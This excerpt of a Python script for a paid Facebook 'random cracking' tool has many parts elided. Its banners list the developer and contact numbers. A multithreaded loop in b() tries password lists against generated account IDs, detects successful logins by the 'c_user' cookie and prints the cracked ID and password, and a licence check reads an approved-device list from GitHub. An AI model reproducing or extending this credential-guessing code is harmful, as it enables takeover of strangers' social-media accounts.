...
logo=(""" 
  \033[30;1m#     #     \033[33;1m#    \03
   \033[30;1m#   #     \033[33;1m# #   \0
    \033[30;1m# #     \033[33;1m#   #  \03
     \033[30;1m#     \033[33;1m#     # \033[35;
     \033[30;1m#     \033[33;1m####### \033[
     \033[30;1m#     \033[33;1m#     # \033[35;1#                                      
\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
...
\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝            
   \033[35;1m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
   \033[35;1m║➣\033[1;91m DEVOLPER   :          BISHAL KING\33[1;92m║               
   \033[35;1m║➣ FACEBOOK   :         Md .Bishal\33[1;92m║                 
   \033[35;1m║➣\033[1;93m WHATSAPP   :          01623461559      \33[1;92m ║
   \033[35;1m║➣\033[1;34m GITHUB     :                 \33[1;92m ║          
   \033[35;1m║➣\033[1;35m TOOLS      :          BD RANDOM CRACKING \33[1;92m ║                 
   \033[35;1m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
""")
...
def Main():
	...
	if opt in ["B","2"]:
		admin()
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/profile.php?id=100069385975893');time.sleep(1)
		fb()
	if opt in ["D","4"]:
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801613312325');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100087096666964&mibextid=ZbWKwL');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://www.youtube.com/@game_changer_team');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def virusA():
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		print('┣━[•] TOTAL ID   :  '+tl)
		print(f'┣━[•] SIM CODE   : \033[33;1m{kode} ')
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mSHAOUM CYBER\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [shaoum cyber-💚] '+cid+' | '+ps+'\33[0;92m')
...
def superuser():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/Shaoumvai/Shaoumvai/blob/main/Approved.txt").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        ...
        print ("\n")
        os.system("espeak \"assalamualaikum ,I am B.D.H.A ROBOT and my boss is Shaoum.Sir this tool is paid because 100% ok id just now login\"")
